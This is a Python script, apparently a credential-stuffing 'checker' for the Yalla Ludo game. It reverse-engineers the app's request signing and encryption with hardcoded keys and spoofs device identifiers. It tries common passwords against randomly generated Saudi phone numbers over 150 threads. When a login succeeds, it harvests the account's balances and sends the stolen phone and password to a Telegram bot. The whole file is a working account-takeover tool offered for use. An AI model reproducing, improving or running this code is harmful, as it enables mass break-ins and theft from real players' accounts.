
import base64, json, hashlib, time, uuid, struct, hmac as hmacmod, random, string, os, threading
import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, Style, init
init(autoreset=True)

version = '2.0'
b1key   = b'4e82797b276c5cb729db62aaa229a057'
b1iv    = b'0102030405060708'
secret  = 'L3)qk*@8'
api     = "https://httpgateway.carrstuv.com/api/LudoAccountLoginRpcApiProxy/MobileAccountLogin"
infopath = "/api/LudoAccountGRpcApiProxy/AccountProfileInfo"
infohosts = [
    "https://httpgateway.talkwxy.com",
    "https://httpgateway.yalla.games",
    "https://httpgateway.beachab.com",
]
ua      = "YallaLudo-1.5.0.0-(Build 1050003)-Android 32"
BOT_TOKEN = input("Enter Token: ")
CHAT_ID = input("Enter ID: ")
valid_accounts_file = "valid_accounts.txt"

kvals = [int(abs(__import__('math').sin(i+1)) * 2**32) & 0xffffffff for i in range(64)]
shift = [7,12,17,22]*4 + [5,9,14,20]*4 + [4,11,16,23]*4 + [6,10,15,21]*4
ivrev = (0x10325476, 0x98badcfe, 0xefcdab89, 0x67452301)

def md5raw(msg, iv):
    a0, b0, c0, d0 = iv
    length = len(msg) * 8
    m = msg + b'\x80'
    while len(m) % 64 != 56:
        m += b'\x00'
    m += struct.pack('<Q', length)
    for ch in range(0, len(m), 64):
        block = struct.unpack('<16I', m[ch:ch+64])
        a, b, c, d = a0, b0, c0, d0
        for i in range(64):
            if   i < 16: f = (b & c) | (~b & d); g = i
            elif i < 32: f = (d & b) | (~d & c); g = (5*i+1) % 16
            elif i < 48: f = b ^ c ^ d;           g = (3*i+5) % 16
            else:        f = c ^ (b | ~d);         g = (7*i)   % 16
            f = (f + a + kvals[i] + block[g]) & 0xffffffff
            a = d; d = c; c = b
            b = (b + ((f << shift[i]) | (f >> (32-shift[i])))) & 0xffffffff
        a0=(a0+a)&0xffffffff; b0=(b0+b)&0xffffffff
        c0=(c0+c)&0xffffffff; d0=(d0+d)&0xffffffff
    return struct.pack('<4I', a0, b0, c0, d0)

def md5r(msg):
    return md5raw(msg, ivrev).hex()

def md5s(msg):
    return hashlib.md5(msg).hexdigest()

def md5upper(text):
    return hashlib.md5(text.encode('utf-8')).hexdigest().upper()

def xorstream(data, hera):
    k  = md5r(hera.encode() + secret.encode()).encode()
    ks = (k * (len(data) // len(k) + 1))[:len(data)]
    return bytes(a ^ b for a, b in zip(data, ks))

def encrypt(data, hera):
    return base64.b64encode(xorstream(data, hera)).decode()

def sign(data, hera):
    key = md5r(hera.encode() + secret.encode()).encode()
    return hmacmod.new(key, data, hashlib.sha256).hexdigest()

def medusa(data, hera):
    pt = f'{md5s(data)}-{len(data)}-{md5r(hera.encode() + secret.encode())}-{secret}'
    ct = AES.new(b1key, AES.MODE_CBC, b1iv).encrypt(pad(pt.encode(), 16))
    return base64.b64encode(ct).decode()

def gendevice():
    device  = str(uuid.uuid4())
    android = f'{uuid.uuid4().hex}_{uuid.uuid4().hex[:16]}'
    chars   = string.ascii_letters + string.digits
    shumeng = ''.join(random.choice(chars) for _ in range(36))
    nonce   = f'{random.randint(-2**31, 2**31 - 1)}_{uuid.uuid4()}'
    return device, android, shumeng, nonce

device, android, shumeng, nonce = gendevice()

def baggage(timestamp):
    obj = {
        "timeSpan": timestamp, "version": "1.5.1.0",
        "deviceId": device, "deviceName": "samsung Galaxy S23 Ultra",
        "deviceType": 2, "downloadChannelId": 1,
        "shuMengId": shumeng, "nonce": nonce,
        "plateType": 0, "LanguageId": 2, "phoneModel": "SM-S918B",
        "X-Phone-Country": "SA", "X-Sim-Country": "SA",
        "AndroidId": android, "appType": 0,
    }
    return base64.b64encode(json.dumps(obj, separators=(',',':')).encode()).decode()

def buildrequest(body, token='', uid='0', path=None):
    now    = int(time.time() * 1000)
    hera   = uuid.uuid4().hex
    bag    = baggage(str(now))
    endpoint = path if path else '/' + '/'.join(api.split('/')[3:])
    signed = (endpoint + token + ua + bag).encode('utf-8')
    xsign   = f'2.0_2_{sign(signed, hera)}'
    xmedusa = medusa(signed, hera)
    wire = json.dumps(
        {"paramJsonString": encrypt(body, hera)},
        separators=(',',':')
    ).encode('utf-8')
    headers = {
        'User-Agent': ua,
        'UserId': str(uid),
        'X-App-Id': 'ludo',
        'X-Baggage': bag,
        'X-Access-Token': token,
        'X-Timestamp': str(now),
        'versionString': '1.5.1.0',
        'X-Sign': xsign,
        'X-Hera': hera,
        'X-Time': str(now),
        'X-Medusa': xmedusa,
        'Content-Type': 'application/json; charset=utf-8',
    }
    return headers, wire

def decode(resp, hera=None):
    xorkey = bytes.fromhex("3336613636313637666532623236633033363933663061643936653462613439")
    param  = resp.get("paramJsonString", "")
    if not param:
        return resp
    raw = base64.b64decode(param)
    try:
        xored = bytes(v ^ xorkey[i % len(xorkey)] for i, v in enumerate(raw))
        return json.loads(xored.decode('utf-8'))
    except Exception:
        pass
    if hera:
        try:
            dec = xorstream(raw, hera)
            return json.loads(dec.decode('utf-8'))
        except Exception:
            pass
    return resp

def login(mobile, password):
    body = json.dumps({
        "mobile": mobile, "areaCode": "966", "password": md5upper(password),
        "languageId": 2, "nationalityId": "1",
        "hostConfig": [
            {"bizType":5000,"countryCode":"IQ","hostUrl":"https://api-shumeng.yalla.games","type":2,"version":4},
            {"bizType":5001,"countryCode":"","hostUrl":"ws://firebreak.yalla.games","type":1,"version":1},
            {"bizType":1006,"countryCode":"IQ","hostUrl":"https://httpgateway.foodjkl.com,https://httpgateway.planecde.com,https://httpgateway.carrstuv.com","type":2,"version":20},
            {"bizType":1000,"countryCode":"IQ","hostUrl":"https://account.foodjkl.com,https://account.yalla.games,https://account.carrstuv.com","type":2,"version":19},
        ],
        "simCountry": "SA", "version": "1.5.1.0",
        "deviceId": device, "deviceName": "samsung Galaxy S23 Ultra",
        "deviceType": 2, "downloadChannelId": 1,
        "shuMengId": shumeng, "nonce": nonce,
        "plateType": 0, "phoneModel": "SM-S918B",
        "X-Phone-Country": "SA", "X-Sim-Country": "SA",
        "AndroidId": android, "IsSubpackages": 0, "appType": 0, "idfa": "",
    }, separators=(',',':'), ensure_ascii=False).encode('utf-8')
    
    headers, wire = buildrequest(body)
    hera = headers['X-Hera']
    
    for domain in ["httpgateway.carrstuv.com", "httpgateway.foodjkl.com", "httpgateway.planecde.com"]:
        try:
            url = f"https://{domain}/api/LudoAccountLoginRpcApiProxy/MobileAccountLogin"
            resp = requests.post(url, data=wire, headers=headers, timeout=10)
            if resp.status_code == 200:
                return decode(resp.json(), hera), hera
        except:
            continue
    return None, None

def fetchinfo(token, uid, account):
    body = json.dumps({
        "accountId": int(account),
        "simCountry": "SA", "version": "1.5.1.0",
        "deviceId": device, "deviceName": "samsung Galaxy S23 Ultra",
        "deviceType": 2, "downloadChannelId": 1,
        "shuMengId": shumeng, "nonce": nonce, "plateType": 0,
        "languageId": 2, "phoneModel": "SM-S918B",
        "X-Phone-Country": "SA", "X-Sim-Country": "SA",
        "AndroidId": android, "IsSubpackages": 0, "appType": 0,
    }, separators=(',',':')).encode('utf-8')
    
    headers, wire = buildrequest(body, token=token, uid=uid, path=infopath)
    headers['accessId'] = md5upper(str(account))
    hera = headers['X-Hera']
    
    for host in infohosts:
        try:
            resp = requests.post(host + infopath, data=wire, headers=headers, timeout=10)
            if resp.status_code == 200:
                return decode(resp.json(), hera)
        except:
            continue
    return None

def get_account_info(token, uid, account):
    return fetchinfo(token, uid, account)

def send_telegram(phone, pwd, name, uid, gold, diamond, level, vip, experience, max_exp):
    if not BOT_TOKEN or not CHAT_ID:
        return
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        text = f"""
🎮 *YALLA LUDO - HIT ACCOUNT*
━━━━━━━━━━━━━━━━━━━━━━
📱 *Phone:* `{phone}`
🔑 *Password:* `{pwd}`
━━━━━━━━━━━━━━━━━━━━━━
👤 *Name:* `{name}`
🆔 *ID:* `{uid}`
━━━━━━━━━━━━━━━━━━━━━━
💰 *Gold:* `{gold}`
💎 *Diamond:* `{diamond}`
⭐ *Level:* `{level}`
📊 *Experience:* `{experience}/{max_exp}`
👑 *VIP:* `{vip}`
━━━━━━━━━━━━━━━━━━━━━━
DEV: @i_j_4
"""
        requests.post(url, json={"chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown"}, timeout=5)
    except:
        pass

def save_valid_account(phone, pwd, name, uid, gold, diamond, level, vip, experience, max_exp):
    try:
        with open(valid_accounts_file, "a", encoding="utf-8") as f:
            f.write(f"Phone: {phone}\nPassword: {pwd}\nName: {name}\nID: {uid}\n")
            f.write(f"Gold: {gold}\nDiamond: {diamond}\nLevel: {level}\n")
            f.write(f"Experience: {experience}/{max_exp}\nVIP: {vip}\n")
            f.write("=" * 50 + "\n")
    except:
        pass

PASSWORDS = ["Aa123123", "Aa123456"]
stats = {'total': 0, 'good': 0, 'wrong_pass': 0, 'not_registered': 0, 'error': 0}
stop_flag = False
lock = threading.Lock()

def generate_mobile():
    return "05" + ''.join([str(random.randint(0, 9)) for _ in range(8)])

def check_number(mobile):
    global stats
    if stop_flag:
        return
    
    for pwd in PASSWORDS:
        if stop_flag:
            return
        
        try:
            login_result, hera = login(mobile, pwd)
            if login_result is None:
                with lock:
                    stats['error'] += 1
                    stats['total'] += 1
                continue
            
            status = login_result.get("status", -1)
            
            if status == 0:
                data = login_result.get("data", {})
                token = data.get("token", "")
                uid = data.get("id", "")
                info_result = get_account_info(token, uid, uid)
                
                base_info = {}
                if info_result and info_result.get("status") == 0:
                    base_info = info_result.get("data", {}).get("baseInfo", {})
                
                name = base_info.get("name", "Unknown")
                gold = base_info.get("goldNum", "0")
                diamond = base_info.get("diamondNum", "0")
                level = base_info.get("levelId", "0")
                experience = base_info.get("experience", "0")
                max_exp = base_info.get("maxExp", "0")
                vip = "Yes" if base_info.get("isVip") else "No"
                
                with lock:
                    stats['good'] += 1
                    stats['total'] += 1
                
                send_telegram(mobile, pwd, name, uid, gold, diamond, level, vip, experience, max_exp)
                save_valid_account(mobile, pwd, name, uid, gold, diamond, level, vip, experience, max_exp)
                return
                
            elif status == 151:
                continue
            elif status == 182 or status == 1001:
                with lock:
                    stats['not_registered'] += 1
                    stats['total'] += 1
                return
            else:
                continue
                
        except Exception as e:
            with lock:
                stats['error'] += 1
                stats['total'] += 1
            continue
    
    with lock:
        stats['wrong_pass'] += 1
        stats['total'] += 1

def print_dashboard():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.CYAN + "=" * 50)
    print(Fore.WHITE + "YALLA LUDO CHECKER - " + Fore.YELLOW + "DEV: @i_j_4")
    print(Fore.CYAN + "=" * 50)
    print(Fore.GREEN + f"HIT: {stats['good']}")
    print(Fore.CYAN + "-" * 30)
    print(Fore.RED + f"TOTAL: {stats['total']}")
    print(Fore.CYAN + "-" * 30)
    print(Fore.MAGENTA + f"Error: {stats['error']}")
    print(Fore.CYAN + "-" * 30)
    print(Fore.YELLOW + f"Wrong Pass: {stats['wrong_pass']}")
    print(Fore.CYAN + "-" * 30)
    print(Fore.BLUE + f"Not Registered: {stats['not_registered']}")
    print(Fore.CYAN + "=" * 50)
    print(Fore.WHITE + "DEV: " + Fore.YELLOW + "@i_j_4")
    print(Fore.CYAN + "=" * 50 + Style.RESET_ALL)

def dashboard_loop():
    while not stop_flag:
        print_dashboard()
        time.sleep(1)

def main():
    global stop_flag
    print("-" * 60)
    THREADS = 150
    
    dashboard_thread = threading.Thread(target=dashboard_loop, daemon=True)
    dashboard_thread.start()
    
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = []
        try:
            while not stop_flag:
                mobile = generate_mobile()
                futures.append(executor.submit(check_number, mobile))
                
                if len(futures) > 1000:
                    for f in as_completed(futures[:500]):
                        pass
                    futures = futures[500:]
                    
        except KeyboardInterrupt:
            stop_flag = True
        
        for f in as_completed(futures):
            pass
    
    time.sleep(1)
    print(f"\n✅ Done!")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nStopped by user.")